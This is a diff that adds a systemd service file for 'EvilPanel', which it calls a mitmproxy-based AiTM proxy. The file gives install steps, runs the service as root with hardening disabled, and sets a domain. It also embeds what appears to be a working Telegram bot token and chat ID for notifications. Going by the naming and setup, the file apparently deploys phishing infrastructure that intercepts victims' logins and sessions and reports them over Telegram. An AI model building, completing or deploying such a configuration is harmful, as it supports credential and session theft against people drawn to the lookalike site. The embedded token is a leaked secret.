@@ -1,0 +1,65 @@
+# EvilPanel Systemd Service Configuration
+# Manages the mitmproxy-based AiTM proxy
+#
+# Installation:
+#   cp evilpanel.service /etc/systemd/system/
+#   systemctl daemon-reload
+#   systemctl enable evilpanel
+#   systemctl start evilpanel
+#
+# Management:
+#   systemctl status evilpanel
+#   journalctl -u evilpanel -f
+#   systemctl restart evilpanel
+
+[Unit]
+Description=EvilPanel AiTM Proxy Service
+Documentation=https://github.com/evilpanel/evilpanel
+After=network.target network-online.target nginx.service
+Wants=network-online.target
+Requires=network.target
+
+[Service]
+Type=simple
+User=root
+Group=root
+
+# Working directory
+WorkingDirectory=/opt/evilpanel
+
+# Environment variables
+Environment="EVILPANEL_DOMAIN=frontnews.site"
+Environment="EVILPANEL_DATA=/opt/evilpanel/data"
+Environment="EVILPANEL_DEBUG=true"
+Environment="EVILPANEL_BOT_BLOCK=true"
+
+# Telegram notifications
+Environment="TELEGRAM_ENABLED=true"
+Environment="TELEGRAM_BOT_TOKEN=8037918547:AAGq23-FlAbxceZHMcP57hP1bNr7s3e8ubo"
+Environment="TELEGRAM_CHAT_ID=8420914588"
+
+# Main process - run.py starts mitmproxy with addon
+ExecStart=/opt/evilpanel/venv/bin/python3 /opt/evilpanel/run.py
+
+# Restart policy
+Restart=always
+RestartSec=5
+TimeoutStopSec=30
+
+# Resource limits
+LimitNOFILE=65535
+LimitNPROC=4096
+
+# Security hardening (limited for operation requirements)
+NoNewPrivileges=false
+ProtectSystem=false
+ProtectHome=false
+PrivateTmp=true
+
+# Logging
+StandardOutput=journal
+StandardError=journal
+SyslogIdentifier=evilpanel
+
+[Install]
+WantedBy=multi-user.target
